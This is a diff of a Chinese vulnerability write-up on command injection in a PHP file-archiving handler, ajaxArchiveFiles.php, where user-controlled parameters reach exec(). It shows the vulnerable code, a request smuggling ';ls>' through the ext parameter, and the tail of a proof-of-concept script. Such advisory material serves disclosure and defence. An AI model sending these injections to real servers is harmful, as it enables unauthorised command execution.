@@ -81,7 +81,7 @@ $mainPath = $_GET['path'];
     exec($commandString);
 ```
 
-![img](https://g.yuque.com/gr/latex?mainPath参数和)**ext参数** 用户可控
+![img](https://g.yuque.com/gr/latex?mainPath%E5%8F%82%E6%95%B0%E5%92%8C)**ext参数** 用户可控
 
 ```php
 $commandString = "sudo -u apache zip -r -j " . $archiveMainPath . "filename" . $today . ".zip " . $mainPath . $ext;
@@ -91,7 +91,7 @@ $commandString = "sudo -u apache zip -r -j " . $archiveMainPath . "filename" . $
 
 请求包为
 
-```plain
+```
 GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1
 Host: 
 Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71
@@ -106,7 +106,7 @@ Content-Length: 2
 
 再请求 [**http://xxx.xxx.xxx.xxx/test.txt**](http://xxx.xxx.xxx.xxx/test.txt) 验证漏洞
 
-![](images/202202162244450.png)
+![](../.gitbook/assets/202202162244450.png)
 
 ## 漏洞POC
 
@@ -209,4 +209,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202162244891.png)
+![](../.gitbook/assets/202202162244891.png)
